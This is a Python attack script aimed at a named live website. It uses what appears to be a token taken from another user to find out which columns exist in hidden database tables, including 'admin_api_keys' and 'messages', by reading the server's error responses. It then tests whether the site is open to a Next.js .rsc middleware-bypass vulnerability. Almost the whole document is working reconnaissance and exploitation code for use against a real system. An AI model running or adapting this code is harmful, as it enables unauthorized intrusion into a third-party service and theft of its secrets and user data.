#!/usr/bin/env python3
"""Final probe: column oracles on hidden tables + May-2026 .rsc middleware-bypass applicability."""
import ssl, json, time, http.cookiejar, urllib.request, urllib.error

CTX = ssl.create_default_context()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
BASE = "https://onlyfakeai.ru"
KEY = "<publishable-key>"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=CTX),
                                 urllib.request.HTTPCookieProcessor(cj))
TOK = json.load(open("their_token.txt"))["access_token"]


def r(url, h=None, b=None):
    hh = {"User-Agent": UA}
    hh.update(h or {})
    rq = urllib.request.Request(url, data=b, headers=hh)
    try:
        with op.open(rq, timeout=20) as x:
            return x.status, dict(x.headers), x.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return 0, {}, str(e).encode()


print("== column oracles (read-only, limit=0) ==")
for t, cols in [
    ("admin_api_keys", "id key api_key key_hash name key_prefix admin_user_id user_id created_at "
                       "revoked_at last_used_at expires_at prefix secret_key active status"),
    ("messages", "id user_id text message content body created_at to from type read "
                 "telegram_id chat_id status"),
]:
    ok, exist = [], []
    for c in cols.split():
        st, hd, b = r(f"{BASE}/api/supabase/rest/v1/{t}?select={c}&limit=0",
                      {"apikey": KEY, "Authorization": "Bearer " + TOK})
        if st == 200:
            ok.append(c)
        elif st == 400 and b"42703" not in b:
            exist.append((c, b[:80]))
        time.sleep(0.1)
    print(f"  {t}: columns exist -> {ok}")
    if exist:
        print(f"    other 400s: {exist[:4]}")

print("\n== May-2026 .rsc middleware-bypass applicability (CVE-2026-44575/45109) ==")
for p in ["/de", "/de.rsc", "/index.rsc", "/en/history", "/en/history.rsc",
          "/en/product/1.rsc", "/en/login.segments/$c$children/__PAGE__.segment.rsc"]:
    st, hd, b = r(BASE + p, {"RSC": "1", "Accept": "text/x-component"})
    print(f"  {p} -> {st} ct={hd.get('content-type','')[:26]} len={len(b)} "
          f"xmw={hd.get('x-middleware-rewrite','')} cache={hd.get('x-nextjs-cache','')}")
    time.sleep(0.6)
